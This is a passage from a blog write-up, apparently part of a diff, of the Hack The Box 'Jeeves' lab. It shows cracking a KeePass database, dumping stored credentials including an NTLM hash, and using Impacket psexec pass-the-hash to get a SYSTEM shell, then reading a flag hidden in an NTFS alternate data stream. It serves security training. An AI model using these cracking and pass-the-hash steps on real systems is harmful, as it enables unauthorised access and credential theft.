+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">6000</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>version<span class="o">)</span> is <span class="m">2</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Cost <span class="m">3</span> <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha<span class="o">])</span> is <span class="m">0</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">20</span> OpenMP threads
+</span></span><span class="line"><span class="cl">moonshine1       <span class="o">(</span>CEH<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:08 DONE <span class="o">(</span>2026-06-08 10:19<span class="o">)</span> 0.1140g/s 6275p/s 6275c/s 6275C/s nana09..marichuy
+</span></span><span class="line"><span class="cl">Session completed
+</span></span></code></pre></div><p>Master password <code>moonshine1</code>. Opened it with <code>kpcli</code> and listed the contents:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kpcli:/&gt; <span class="nv">ls</span>
+</span></span><span class="line"><span class="cl"><span class="o">===</span> <span class="nv">Groups</span> <span class="o">===</span>
+</span></span><span class="line"><span class="cl">CEH/
+</span></span><span class="line"><span class="cl">kpcli:/&gt; <span class="nb">cd</span> CEH
+</span></span><span class="line"><span class="cl">kpcli:/CEH&gt; <span class="nv">ls</span>
+</span></span><span class="line"><span class="cl"><span class="o">===</span> <span class="nv">Groups</span> <span class="o">===</span>
+</span></span><span class="line"><span class="cl">eMail/
+</span></span><span class="line"><span class="cl">General/
+</span></span><span class="line"><span class="cl">Homebanking/
+</span></span><span class="line"><span class="cl">Internet/
+</span></span><span class="line"><span class="cl">Network/
+</span></span><span class="line"><span class="cl">Windows/
+</span></span><span class="line"><span class="cl"><span class="o">===</span> <span class="nv">Entries</span> <span class="o">===</span>
+</span></span><span class="line"><span class="cl">0. Backup stuff                                                           
+</span></span><span class="line"><span class="cl">1. Bank of America                                   www.bankofamerica.com
+</span></span><span class="line"><span class="cl">2. DC Recovery PW                                                         
+</span></span><span class="line"><span class="cl">3. EC-Council                               www.eccouncil.org/programs/cer
+</span></span><span class="line"><span class="cl">4. It<span class="err">&#39;</span>s a secret                                 localhost:8180/secret.jsp
+</span></span><span class="line"><span class="cl">5. Jenkins admin                                            localhost:8080
+</span></span><span class="line"><span class="cl">6. Keys to the kingdom                                                    
+</span></span><span class="line"><span class="cl">7. Walmart.com                                             www.walmart.com
+</span></span></code></pre></div><p>Entry 0 (Backup stuff) and entry 2 (DC Recovery PW) were the obvious ones to check:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kpcli:/CEH&gt; show -f <span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Title: Backup stuff
+</span></span><span class="line"><span class="cl">Uname: ?
+</span></span><span class="line"><span class="cl"> Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+</span></span><span class="line"><span class="cl">  URL: 
+</span></span><span class="line"><span class="cl">Notes: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kpcli:/CEH&gt; show -f <span class="m">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Title: DC Recovery PW
+</span></span><span class="line"><span class="cl">Uname: administrator
+</span></span><span class="line"><span class="cl"> Pass: S1TjAtJHKsugh9oC4VZl
+</span></span><span class="line"><span class="cl">  URL: 
+</span></span><span class="line"><span class="cl">Notes: 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kpcli:/CEH&gt; show -f <span class="m">6</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Title: Keys to the kingdom
+</span></span><span class="line"><span class="cl">Uname: bob
+</span></span><span class="line"><span class="cl"> Pass: lCEUnYPjNfIuPZSzOySA
+</span></span><span class="line"><span class="cl">  URL: 
+</span></span><span class="line"><span class="cl">Notes:
+</span></span></code></pre></div><p>&ldquo;Backup stuff&rdquo; has a password that&rsquo;s formatted as an NTLM hash: <code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code>. The first half (<code>aad3b435b51404eeaad3b435b51404ee</code>) is the blank LM hash - Windows uses this as a placeholder when LM hashing is disabled. The second half is the NT hash. Someone stored an NTLM hash directly in a KeePass entry, probably as a backup credential.</p>
+<p>NTLM doesn&rsquo;t require you to know the plaintext password - you can authenticate directly with the hash. <code>psexec.py</code> with <code>-hashes</code> handles this:</p>
+<h2 id="pass-the-hash-to-system">Pass-the-Hash to SYSTEM</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/jeeves ✗ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.129.228.112
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Requesting shares on 10.129.228.112.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Uploading file supQElfi.exe
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Opening SVCManager on 10.129.228.112.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating service guYk on 10.129.228.112.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting service guYk.....
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.10586<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span></code></pre></div><p>SYSTEM. But the root flag had one more trick in it:</p>
+<pre tabindex="0"><code>C:\Users\Administrator\Desktop&gt; dir
+
+11/08/2017  10:05 AM    &lt;DIR&gt;          .
+11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+
+C:\Users\Administrator\Desktop&gt; type hm.txt
+The flag is elsewhere.  Look deeper.
+</code></pre><h2 id="ntfs-alternate-data-streams">NTFS Alternate Data Streams</h2>
+<p>NTFS allows files to have multiple named data streams attached to the same filename. A regular file has one default stream (<code>$DATA</code>) - that&rsquo;s what <code>type</code> reads and what <code>dir</code> shows the size of. You can attach additional named streams to the same file and they&rsquo;re completely invisible to a normal <code>dir</code> listing. The only way to see them is with <code>dir /r</code>, which shows alternate streams explicitly:</p>
+<pre tabindex="0"><code>C:\Users\Administrator\Desktop&gt; dir /r C:\Users\Administrator\Desktop\hm.txt
+ Volume in drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:\Users\Administrator\Desktop
+
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+</code></pre><p><code>hm.txt:root.txt:$DATA</code> - there&rsquo;s a second stream named <code>root.txt</code> attached to <code>hm.txt</code>. Reading it by name:</p>
+<pre tabindex="0"><code>C:\Users\Administrator\Desktop&gt; more &lt; hm.txt:root.txt
+</code></pre><p>Root flag. The NTFS ADS trick is a classic HTB finale - easy once you know it, completely invisible if you don&rsquo;t think to look. Worth keeping <code>dir /r</code> in muscle memory for any Windows box where a flag file looks suspiciously small or returns a troll message.</p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
